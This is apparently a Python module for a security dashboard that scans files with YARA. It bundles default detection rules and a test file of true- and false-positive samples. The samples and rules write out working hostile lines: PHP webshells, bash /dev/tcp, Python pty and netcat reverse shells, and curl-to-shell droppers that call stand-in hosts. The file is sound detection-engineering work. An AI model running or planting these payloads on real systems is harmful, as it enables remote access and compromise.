"""YARA 파일 스캐너 — 내용 기반 악성코드 탐지.

`hash_checker` 의 해시 대조는 **'알려진 바로 그 파일'** 만 잡는다. 한 바이트만
바뀌어도 해시가 달라져 놓친다. YARA 는 파일 내용의 패턴으로 잡으므로 변종에
강하다. 둘은 대체가 아니라 보완이다 — 해시는 확정적이고 YARA 는 일반화된다.

Sigma 엔진과 같은 원칙으로 만든다.

- **없어도 뜬다**: `yara-python` 미설치면 비활성 상태로 보고하고 앱은 정상 기동한다.
- **detection-as-code**: 룰의 정탐/오탐 샘플이 `data/yara/rule_tests.yml` 에 있고
  CI 가 검증한다(`tests/test_yara_rules.py`). 오탐 나는 룰은 머지되지 않는다.
- **MITRE 매핑**: 룰 `meta.mitre` 가 커버리지 자가 진단에 그대로 들어간다.

**안전 한계를 먼저 정한다.** 스캐너가 관제 서버를 잡아먹으면 안 된다:
파일 크기 상한·스캔 타임아웃·허용 디렉터리 밖 거부. 디렉터리 스캔은 파일 수
상한을 두고, 심볼릭 링크는 따라가지 않는다(경로 탈출 방지).
"""
import os
import threading
import time
from collections import deque
from datetime import datetime

from modules.logging_setup import get_logger
from modules.telemetry import telemetry

_log = get_logger(__name__)

try:
    import yara
    YARA_OK = True
except ImportError:      # pragma: no cover - 설치 여부에 따라 갈린다
    yara = None
    YARA_OK = False

SEVERITY_ORDER = {"LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}


class YaraScanner:
    def __init__(self, socketio=None, config=None, threat_detector=None,
                 mitre_tracker=None):
        self.socketio = socketio
        self.config = config or {}
        self.threat_detector = threat_detector
        self.mitre = mitre_tracker
        self.running = False
        self._lock = threading.Lock()

        self.rules_dir = self.config.get("YARA_RULES_DIR", "data/yara")
        self.max_file_mb = float(self.config.get("YARA_MAX_FILE_MB", 32))
        self.timeout = int(self.config.get("YARA_TIMEOUT", 10))
        self.max_files = int(self.config.get("YARA_MAX_FILES", 2000))

        self.auto_scan_processes = bool(self.config.get("YARA_SCAN_PROCESSES", True))
        self.watch_dirs = [d.strip() for d in
                           str(self.config.get("YARA_WATCH_DIRS", "")).split(",")
                           if d.strip()]
        self.watch_interval = float(self.config.get("YARA_WATCH_INTERVAL", 30))
        # 같은 파일(경로+크기+mtime)을 반복 스캔하지 않기 위한 지문 집합
        self._seen = set()
        self._seen_cap = int(self.config.get("YARA_SEEN_CACHE", 20000))
        self._watch_thread = None

        self._rules = None            # 컴파일된 yara.Rules
        self.rule_meta = []           # 패널·커버리지용 룰 목록
        self.matches = deque(maxlen=200)
        self.stats = {
            "enabled": YARA_OK, "rules_loaded": 0, "rules_error": 0,
            "files_scanned": 0, "matches": 0, "skipped_too_big": 0,
            "errors": 0, "last_load": None, "last_scan": None,
            "auto_scanned": 0, "auto_skipped_cached": 0,
            "skipped_no_permission": 0,
        }

    # ------------------------------------------------------------------ #
    #  라이프사이클
    # ------------------------------------------------------------------ #

    def _bundle_default_rules(self):
        """룰 디렉터리가 없거나 비었으면 기본 룰을 깔아둔다.

        이게 없으면 **작업 디렉터리가 저장소 밖일 때 탐지가 통째로 죽는다**
        (systemd 의 WorkingDirectory 가 다른 경우 등). 실제로 격리 환경에서
        띄웠더니 "룰 디렉터리 접근 불가" 한 줄만 남기고 조용히 아무것도
        탐지하지 않았다. 프로젝트 규칙("모든 모듈은 데모 fallback 필수")대로
        Sigma 와 같은 방식을 쓴다.
        """
        try:
            os.makedirs(self.rules_dir, exist_ok=True)
            existing = [f for f in os.listdir(self.rules_dir)
                        if f.endswith((".yar", ".yara"))]
            if existing:
                return 0
            for name, content in BUNDLED_YARA_FILES.items():
                with open(os.path.join(self.rules_dir, name), "w", encoding="utf-8") as f:
                    f.write(content.lstrip())
            _log.info(f"[YARA] 룰이 없어 기본 룰 {len(BUNDLED_YARA_FILES)}개 파일 생성"
                      f" — {self.rules_dir}")
            return len(BUNDLED_YARA_FILES)
        except OSError as e:
            _log.error(f"[YARA] 기본 룰 생성 실패: {e}")
            return 0

    def start(self, demo=True):
        self.running = True
        if not YARA_OK:
            _log.warning("[YARA] yara-python 미설치 — 파일 내용 기반 탐지 비활성 "
                         "(해시 대조는 그대로 동작)")
            return
        self._bundle_default_rules()
        self.load_rules()
        _log.info(f"[YARA] 스캐너 시작 — 룰 {self.stats['rules_loaded']}개 "
                  f"· 파일 상한 {self.max_file_mb:g}MB · 타임아웃 {self.timeout}s"
                  f" · 프로세스 자동스캔 {'ON' if self.auto_scan_processes else 'OFF'}")
        if self.watch_dirs:
            self._watch_thread = threading.Thread(target=self._watch_loop, daemon=True)
            self._watch_thread.start()
            _log.info(f"[YARA] 디렉터리 감시 시작 — {', '.join(self.watch_dirs)} "
                      f"({self.watch_interval:g}초 주기)")

    def stop(self):
        self.running = False

    def load_rules(self):
        """`rules_dir` 의 .yar/.yara 를 컴파일한다. 실패해도 기존 룰을 유지한다."""
        if not YARA_OK:
            return 0
        paths = {}
        try:
            for name in sorted(os.listdir(self.rules_dir)):
                if name.endswith((".yar", ".yara")):
                    paths[os.path.splitext(name)[0]] = os.path.join(self.rules_dir, name)
        except OSError as e:
            _log.error(f"[YARA] 룰 디렉터리 접근 불가({self.rules_dir}): {e}")
            with self._lock:
                self.stats["rules_error"] += 1
            return 0
        if not paths:
            _log.warning(f"[YARA] {self.rules_dir} 에 룰이 없다")
            return 0
        try:
            compiled = yara.compile(filepaths=paths)
        except Exception as e:
            # 컴파일 실패 시 기존 룰을 살려둔다 — 잘못된 룰 하나로 탐지가 통째로
            # 꺼지는 편보다 낫다.
            _log.error(f"[YARA] 룰 컴파일 실패: {e}")
            with self._lock:
                self.stats["rules_error"] += 1
            return 0
        meta = self._describe(compiled)
        with self._lock:
            self._rules = compiled
            self.rule_meta = meta
            self.stats["rules_loaded"] = len(meta)
            self.stats["last_load"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return len(meta)

    @staticmethod
    def _describe(compiled):
        out = []
        for rule in compiled:
            meta = dict(getattr(rule, "meta", {}) or {})
            out.append({
                "name": rule.identifier,
                "description": meta.get("description", ""),
                "severity": str(meta.get("severity", "MEDIUM")).upper(),
                "mitre": str(meta.get("mitre", "")).upper() or None,
                "author": meta.get("author", ""),
                # "manual" 룰은 자동 스캔에서 제외한다 — 분석가가 파일을 지목해
                # 볼 때는 유용하지만 시스템 전체를 훑을 때는 소음인 룰이 있다.
                "scope": str(meta.get("scope", "auto")).lower(),
            })
        return sorted(out, key=lambda r: r["name"])

    # ------------------------------------------------------------------ #
    #  스캔
    # ------------------------------------------------------------------ #

    def scan_file(self, path, scope="manual"):
        """파일 1개 스캔. 결과 dict 반환(예외를 밖으로 내보내지 않는다).

        `scope="auto"` 면 `scope = "manual"` 로 표시된 룰의 매치를 버린다.
        자동 스캔은 시스템 전체를 훑으므로 오탐 기준이 다르다.
        """
        if not YARA_OK:
            return {"path": path, "error": "yara-python 미설치", "enabled": False,
                    "matches": []}
        with self._lock:
            rules = self._rules
        if rules is None:
            return {"path": path, "error": "로드된 룰 없음", "matches": []}
        try:
            size = os.path.getsize(path)
        except OSError as e:
            return {"path": path, "error": f"파일 접근 불가: {e}", "matches": []}
        if size > self.max_file_mb * 1024 * 1024:
            with self._lock:
                self.stats["skipped_too_big"] += 1
            return {"path": path, "size": size, "matches": [], "skipped": True,
                    "error": f"{self.max_file_mb:g}MB 초과 — 건너뜀"}

        try:
            with telemetry.timed("yara.scan_file"):
                raw = rules.match(path, timeout=self.timeout)
        except Exception as e:
            # 권한 없는 파일은 **오류가 아니라 예상된 상황**이다. 자동 스캔이
            # /etc 를 훑으면 shadow·sudoers 등에서 매번 걸린다 — 이걸 ERROR 로
            # 세면 로그가 잠기고 텔레메트리의 실패 카운터가 거짓말을 한다.
            if self._is_permission_error(path, e):
                with self._lock:
                    self.stats["skipped_no_permission"] += 1
                _log.debug(f"[YARA] 권한 없음, 건너뜀: {path}")
                return {"path": path, "matches": [], "skipped": True,
                        "error": "읽기 권한 없음"}
            with self._lock:
                self.stats["errors"] += 1
            _log.error(f"[YARA] 스캔 오류({path}): {e}")
            return {"path": path, "error": str(e), "matches": []}

        matches = [self._match_dict(m) for m in raw]
        if scope == "auto":
            matches = [m for m in matches if m.get("scope", "auto") != "manual"]
        result = {
            "path": path, "size": size, "matches": matches,
            "malicious": bool(matches),
            "severity": self._top_severity(matches),
            "scanned_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        with self._lock:
            self.stats["files_scanned"] += 1
            self.stats["last_scan"] = result["scanned_at"]
            if matches:
                self.stats["matches"] += len(matches)
                self.matches.appendleft(result)
        if matches:
            self._report(result)
        return result

    @staticmethod
    def _is_permission_error(path, exc):
        """yara 는 권한 오류도 문자열 메시지로 준다 — 실제 접근 가능 여부로 확인한다."""
        if isinstance(exc, PermissionError):
            return True
        return not os.access(path, os.R_OK)

    def scan_data(self, data):
        """바이트열 스캔 — 룰 테스트·업로드 검사용(파일을 만들지 않는다)."""
        if not YARA_OK:
            return []
        with self._lock:
            rules = self._rules
        if rules is None:
            return []
        if isinstance(data, str):
            data = data.encode("utf-8", "replace")
        try:
            return [self._match_dict(m) for m in rules.match(data=data,
                                                             timeout=self.timeout)]
        except Exception as e:
            _log.error(f"[YARA] 데이터 스캔 오류: {e}")
            return []

    def scan_directory(self, directory, extensions=None, scope="manual"):
        """디렉터리 재귀 스캔. 파일 수 상한을 두고 심볼릭 링크는 따라가지 않는다."""
        results, scanned = [], 0
        truncated = False
        for root, dirs, files in os.walk(directory, followlinks=False):
            dirs[:] = [d for d in dirs if not os.path.islink(os.path.join(root, d))]
            for name in sorted(files):
                full = os.path.join(root, name)
                if os.path.islink(full):
                    continue
                if extensions and os.path.splitext(name)[1].lower() not in extensions:
                    continue
                if scanned >= self.max_files:
                    truncated = True
                    break
                scanned += 1
                res = self.scan_file(full, scope=scope)
                if res.get("matches"):
                    results.append(res)
            if truncated:
                break
        return {
            "directory": directory, "files_scanned": scanned,
            "matched_files": len(results), "results": results,
            "truncated": truncated, "max_files": self.max_files,
        }

    # ------------------------------------------------------------------ #

    @staticmethod
    def _match_dict(match):
        meta = dict(getattr(match, "meta", {}) or {})
        # 문자열 원문은 담지 않는다 — 악성 페이로드 사본을 만들 이유가 없다.
        # 어떤 패턴이 걸렸는지(식별자)와 개수만 남긴다.
        hits = {}
        for s in getattr(match, "strings", []) or []:
            ident = getattr(s, "identifier", None) or str(s)
            hits[ident] = hits.get(ident, 0) + len(getattr(s, "instances", []) or [1])
        return {
            "rule": match.rule,
            "description": meta.get("description", ""),
            "severity": str(meta.get("severity", "MEDIUM")).upper(),
            "mitre": str(meta.get("mitre", "")).upper() or None,
            "scope": str(meta.get("scope", "auto")).lower(),
            "tags": list(getattr(match, "tags", []) or []),
            "matched_strings": sorted(hits),
            "match_count": sum(hits.values()) or len(hits),
        }

    @staticmethod
    def _top_severity(matches):
        if not matches:
            return None
        return max((m["severity"] for m in matches),
                   key=lambda s: SEVERITY_ORDER.get(s, 0))

    def _report(self, result):
        """탐지를 파이프라인에 투입한다. 실패해도 스캔 결과는 그대로 돌려준다."""
        top = max(result["matches"], key=lambda m: SEVERITY_ORDER.get(m["severity"], 0))
        try:
            if self.threat_detector:
                self.threat_detector.report_alert(
                    "MALWARE_FILE", result["severity"],
                    src_ip=os.uname().nodename if hasattr(os, "uname") else "localhost",
                    dst_ip="",
                    description=f"YARA 탐지: {top['rule']} — {os.path.basename(result['path'])}",
                    details={"source": "yara", "path": result["path"],
                             "rule_id": top["rule"], "mitre": top["mitre"],
                             "rules": [m["rule"] for m in result["matches"]],
                             "matched_strings": top["matched_strings"]})
        except Exception as e:
            _log.error(f"[YARA] 알림 전달 오류: {e}")
        try:
            if self.mitre and top.get("mitre"):
                self.mitre.map_threat("MALWARE_FILE", description=top["rule"])
        except Exception as e:
            _log.error(f"[YARA] MITRE 매핑 오류: {e}")
        try:
            if self.socketio:
                self.socketio.emit("yara_match", {
                    "path": result["path"], "severity": result["severity"],
                    "rules": [m["rule"] for m in result["matches"]],
                    "scanned_at": result["scanned_at"]})
        except Exception:
            pass

    # ------------------------------------------------------------------ #
    #  자동 스캔 — 실행 파일 · 디렉터리 감시
    # ------------------------------------------------------------------ #

    def _seen_key(self, path):
        """경로+크기+수정시각. 같은 파일을 반복 스캔하지 않기 위한 지문."""
        try:
            st = os.stat(path)
        except OSError:
            return None
        return (os.path.realpath(path), st.st_size, int(st.st_mtime))

    def scan_once(self, path):
        """같은 내용을 이미 본 적 있으면 건너뛴다. (결과 or None) 반환.

        자동 스캔의 전제는 **같은 파일을 반복해서 읽지 않는 것**이다. EDR 은
        수 초마다 같은 프로세스 목록을 돌려주므로, 캐시가 없으면 /usr/bin/python3
        를 하루에 수만 번 읽는다.
        """
        key = self._seen_key(path)
        if key is None:
            return None
        with self._lock:
            if key in self._seen:
                self.stats["auto_skipped_cached"] += 1
                return None
            self._seen.add(key)
            if len(self._seen) > self._seen_cap:
                # 오래된 절반을 버린다 — 정확한 LRU 가 필요할 만큼 비싸지 않다
                self._seen = set(list(self._seen)[self._seen_cap // 2:])
        self.stats["auto_scanned"] += 1
        return self.scan_file(path, scope="auto")

    def scan_process_images(self, processes):
        """EDR 이 관측한 프로세스의 실행 파일을 스캔한다.

        `HASH_SCAN_ALLOWED_DIRS` 를 적용하지 않는다 — 프로세스 실행 파일은
        /usr/bin 등 시스템 경로에 있고, 그 제한은 **API 로 들어오는 임의 경로**를
        막기 위한 것이지 내부 자동 스캔용이 아니다. 대신 파일 크기 상한과
        중복 스캔 캐시로 비용을 통제한다.
        """
        if not (YARA_OK and self.auto_scan_processes):
            return []
        hits = []
        for proc in processes or []:
            path = (proc or {}).get("exe_path") or ""
            if not path or not os.path.isabs(path) or not os.path.isfile(path):
                continue
            result = self.scan_once(path)
            if result and result.get("matches"):
                hits.append(result)
        return hits

    def _watch_loop(self):
        """감시 디렉터리에 새로 생기거나 바뀐 파일만 스캔한다."""
        while self.running and self.watch_dirs:
            for directory in self.watch_dirs:
                if not os.path.isdir(directory):
                    continue
                try:
                    scanned = 0
                    for root, dirs, files in os.walk(directory, followlinks=False):
                        dirs[:] = [d for d in dirs
                                   if not os.path.islink(os.path.join(root, d))]
                        for name in files:
                            if scanned >= self.max_files:
                                break
                            full = os.path.join(root, name)
                            if os.path.islink(full):
                                continue
                            scanned += 1
                            self.scan_once(full)
                except OSError as e:
                    _log.error(f"[YARA] 감시 디렉터리 오류({directory}): {e}")
            for _ in range(int(self.watch_interval)):
                if not self.running:
                    return
                time.sleep(1)

    def get_status(self):
        with self._lock:
            return {
                "running": self.running,
                "stats": dict(self.stats),
                "rules": list(self.rule_meta),
                "matches": list(self.matches)[:30],
                "limits": {"max_file_mb": self.max_file_mb, "timeout": self.timeout,
                           "max_files": self.max_files},
                "auto": {"processes": self.auto_scan_processes,
                         "watch_dirs": list(self.watch_dirs),
                         "watch_interval": self.watch_interval,
                         "cache_size": len(self._seen)},
            }


# ─────────────────────────────────────────────────────────────────────────
#  기본 룰 사본 — 룰 디렉터리가 없거나 비었을 때만 쓰인다.
#
#  **raw 문자열이어야 한다.** 룰의 정규식에 \n·\s 가 들어 있어 일반 문자열로
#  담으면 이스케이프가 해석돼 **다른 룰이 된다**(실제로 한 번 그렇게 깨졌다).
#  손으로 고치지 말고 data/yara/ 를 고친 뒤 다시 생성할 것 —
#  tests/test_yara_rules.py::test_bundled_rules_match_the_shipped_files 가 강제한다.
# ─────────────────────────────────────────────────────────────────────────
BUNDLED_YARA_FILES = {
    "soc_default.yar": r"""
/*
 * SOC 대시보드 기본 YARA 룰
 *
 * 해시 대조(hash_checker)는 '알려진 그 파일'만 잡는다 — 한 바이트만 바뀌어도
 * 놓친다. YARA 는 내용 패턴으로 잡으므로 변종에 강하다. 둘은 대체가 아니라 보완이다.
 *
 * meta.mitre 는 커버리지 자가 진단(modules/coverage.py)이 읽는다.
 * 각 룰의 정탐/오탐 샘플은 data/yara/rule_tests.yml 에 있고 CI 가 검증한다.
 */

rule SOC_EICAR_Test_File
{
    meta:
        description = "EICAR 표준 안티바이러스 테스트 문자열 (악성 아님, 배선 검증용)"
        author = "SOC Dashboard"
        severity = "LOW"
        mitre = "T1204"
    strings:
        $eicar = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
    condition:
        $eicar
}

rule SOC_PHP_Webshell
{
    meta:
        description = "PHP 웹셸 — 사용자 입력을 그대로 실행하는 패턴"
        author = "SOC Dashboard"
        severity = "CRITICAL"
        mitre = "T1505"
    strings:
        $php  = "<?php"
        $exec1 = "eval("  nocase
        $exec2 = "system(" nocase
        $exec3 = "passthru(" nocase
        $exec4 = "shell_exec(" nocase
        $input1 = "$_POST"
        $input2 = "$_GET"
        $input3 = "$_REQUEST"
    condition:
        $php and any of ($exec*) and any of ($input*)
}

rule SOC_Reverse_Shell_Script
{
    meta:
        description = "스크립트 형태의 리버스 셸 (bash /dev/tcp · python socket)"
        author = "SOC Dashboard"
        severity = "CRITICAL"
        mitre = "T1059"
    strings:
        $bash_tcp   = "/dev/tcp/"
        $bash_i     = "bash -i"
        $py_sock    = "socket.socket("
        $py_dup     = "os.dup2("
        $py_shell   = "pty.spawn("
        $nc_e       = "nc -e "
    condition:
        ($bash_tcp and $bash_i) or ($py_sock and $py_dup and $py_shell) or $nc_e
}

rule SOC_Cryptominer_Artifact
{
    meta:
        description = "크립토마이너 바이너리·설정 — 채굴 풀 접속 문자열"
        author = "SOC Dashboard"
        severity = "HIGH"
        mitre = "T1496"
    strings:
        $pool1 = "stratum+tcp://"
        $pool2 = "stratum+ssl://"
        $pool3 = "minexmr"
        $pool4 = "supportxmr"
        $bin1  = "xmrig"
        $bin2  = "cpuminer"
    condition:
        any of ($pool*) or any of ($bin*)
}

rule SOC_UPX_Packed_ELF
{
    meta:
        description = "UPX 로 패킹된 ELF — 리눅스 악성코드가 흔히 쓰는 난독화"
        author = "SOC Dashboard"
        severity = "MEDIUM"
        mitre = "T1027"
        // 자동 스캔에서는 제외한다(scope=manual).
        //
        // **UPX 패킹 자체는 악성이 아니다.** 정상 소프트웨어도 쓰고, 무엇보다
        // 패커 도구(/usr/bin/upx-ucl)가 자기 시그니처를 담고 있어 CI 에서
        // 걸렸다. 패킹된 파일과 패커를 내용만으로 구분하려면 UPX 트레일러
        // magic 의 위치를 봐야 하는데, 검증할 실제 패킹 샘플이 없어 추측으로
        // 룰을 조이지 않았다.
        //
        // 패킹은 **탐지가 아니라 정황**이다. 분석가가 특정 파일을 지목해
        // 들여다볼 때(수동 스캔)는 유용하고, 시스템 전체를 훑는 자동 스캔에서는
        // 소음이다. 그 구분을 여기 적는다.
        scope = "manual"
    strings:
        $upx1 = "UPX!"
        $upx2 = "$Info: This file is packed with the UPX"
    condition:
        uint32(0) == 0x464C457F and any of ($upx*)
}

rule SOC_Curl_Pipe_Shell_Dropper
{
    meta:
        description = "원격 스크립트를 받아 바로 실행하는 드로퍼"
        author = "SOC Dashboard"
        severity = "HIGH"
        mitre = "T1105"
        // 오탐을 두 번 줄였다. 둘 다 실측에서 나왔다.
        //
        // 1) 처음에는 "curl " 과 "| sh" 를 각각 찾아 AND 로 묶었다. /usr/bin 743개를
        //    스캔하니 ctest·tailscale 이 걸렸다 — 바이너리 안에 두 문자열이 서로
        //    멀리 떨어져 있었을 뿐이다. 실제 드로퍼는 **한 명령줄 안에서** 파이프가
        //    이어지므로 근접성을 조건에 넣었다.
        // 2) 그래도 CI 러너의 GNU parallel 이 걸렸다. 자기 설치 안내문에
        //    "wget -O - pi.dk/3 | bash" 가 들어 있다 — 문서에 적힌 명령과 실행되는
        //    명령을 YARA 가 구분할 수는 없다. 대신 **스킴이 있는 전체 URL**을
        //    요구했다. 실제 드로퍼는 http(s):// 를 쓰고, 문서의 축약형은 빠진다.
        //
        // 알려진 한계: `curl evil.example/x | sh` 처럼 스킴 없이 쓰는 드로퍼는
        // 놓친다. 자동 스캔이 시스템 전체를 훑는 이상 오탐을 줄이는 쪽을 택했다
        // — 늑대소년이 되면 사람이 알림을 안 본다.
    strings:
        $dropper = /(curl|wget)[^\n\r]{0,200}https?:\/\/[^\n\r]{0,200}\|\s{0,4}(sudo\s+|env\s+)?(ba|z|k|da)?sh\b/
    condition:
        $dropper
}
""",
    "rule_tests.yml": r"""
# YARA 룰의 정탐/오탐 샘플 — CI 가 매 push 마다 검증한다 (detection-as-code).
#
# YARA 의 meta 는 스칼라만 담을 수 있어 Sigma 처럼 룰 파일 안에 테스트를 넣지
# 못한다. 그래서 룰 이름을 키로 하는 이 파일에 둔다.
#
# **negative 가 핵심이다.** 오탐은 조용히 쌓이다가 분석가가 알림을 무시하게
# 만드는 방식으로 탐지 체계를 망가뜨린다. 정상 파일 샘플을 반드시 넣을 것.

SOC_EICAR_Test_File:
  positive:
    - name: EICAR 표준 테스트 문자열
      content: 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
  negative:
    - name: EICAR 를 언급만 하는 문서
      content: "이 문서는 EICAR 테스트 파일 사용법을 설명합니다."

SOC_PHP_Webshell:
  positive:
    - name: 전형적인 eval 웹셸
      content: "<?php eval($_POST['cmd']); ?>"
    - name: system + GET 파라미터
      content: "<?php system($_GET['c']); ?>"
  negative:
    - name: 평범한 PHP 출력
      content: "<?php echo 'hello world'; ?>"
    - name: eval 을 쓰지만 사용자 입력이 아님
      content: "<?php eval('$x = 1;'); ?>"
    - name: PHP 가 아닌 자바스크립트의 eval
      content: "const f = () => eval(localStorage.getItem('cfg'));"

SOC_Reverse_Shell_Script:
  positive:
    - name: bash /dev/tcp 리버스 셸
      content: "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"
    - name: python pty 리버스 셸
      content: |
        import socket,os,pty
        s=socket.socket(); s.connect(("203.0.113.10",4444))
        os.dup2(s.fileno(),0); pty.spawn("/bin/bash")
    - name: netcat -e
      content: "nc -e /bin/sh 203.0.113.10 4444"
  negative:
    - name: 평범한 배포 스크립트
      content: "#!/bin/bash\nset -e\nbash /opt/deploy/release.sh --env prod"
    - name: 소켓만 쓰는 정상 파이썬 서비스
      content: |
        import socket
        s = socket.socket()
        s.bind(("0.0.0.0", 8080))

SOC_Cryptominer_Artifact:
  positive:
    - name: 채굴 풀 접속 설정
      content: '{"pools":[{"url":"stratum+tcp://pool.minexmr.com:4444"}]}'
    - name: xmrig 바이너리 문자열
      content: "xmrig 6.20.0 built for Linux"
  negative:
    - name: 커넥션 풀 설정 (Sigma 쪽에서 오탐이었던 그 패턴)
      content: 'spring.datasource.hikari.maximum-pool-size=20'
    - name: 평범한 JSON 설정
      content: '{"workers": 4, "pool_timeout": 30}'

SOC_UPX_Packed_ELF:
  positive:
    - name: UPX 로 패킹된 ELF 헤더
      content_b64: "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAVVBYIQ=="
  negative:
    - name: 패킹되지 않은 ELF
      content_b64: "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAAAAAAA=="
    - name: UPX 를 언급하는 텍스트 (ELF 아님)
      content: "UPX! 로 패킹된 바이너리는 언패킹 후 분석한다"

SOC_Curl_Pipe_Shell_Dropper:
  positive:
    - name: curl 파이프 bash
      content: "curl -s http://malware.example/x.sh | bash"
    - name: wget 파이프 sh (공백 없음)
      content: "wget -qO- http://malware.example/x |sh"
    - name: sudo 를 끼운 설치 스크립트 형태
      content: "curl -fsSL https://get.example.com/install.sh | sudo bash"
    - name: zsh 로 파이프
      content: "curl http://malware.example/x | zsh"
  negative:
    - name: 평범한 헬스체크
      content: "curl -sf https://api.example.com/health || exit 1"
    - name: 로컬 스크립트를 셸에 파이프 (다운로드 아님)
      content: "cat /opt/setup.sh | bash"
    - name: 받아서 검증만 (파이프 없음)
      content: "curl -o out.bin http://example.com/f && sha256sum out.bin"
    # /usr/bin 743개를 실제로 스캔했더니 ctest·tailscale 이 걸렸다 — 바이너리 안에
    # "curl " 과 "| sh" 가 **서로 멀리 떨어져** 있었을 뿐이다. 자동 스캔을 켜면
    # 이런 게 매번 알림으로 올라온다. 근접성 조건으로 고쳤고 여기서 고정한다.
    # CI 러너의 GNU parallel 이 자기 설치 안내문 때문에 걸렸다. 문서에 적힌
    # 명령과 실행되는 명령을 YARA 는 구분 못 하므로, 스킴 있는 전체 URL 을 요구해
    # 축약형을 뺐다.
    - name: 문서에 적힌 축약형 설치 명령 (GNU parallel 실측 오탐이었다)
      content: "Install: wget -O - pi.dk/3 | bash"
    - name: 문자열이 흩어진 바이너리 (실측 오탐이었다)
      content: "curl usage: fetch a URL\n\n....(다른 섹션)....\n\npipe to | sh is unsupported"
""",
}
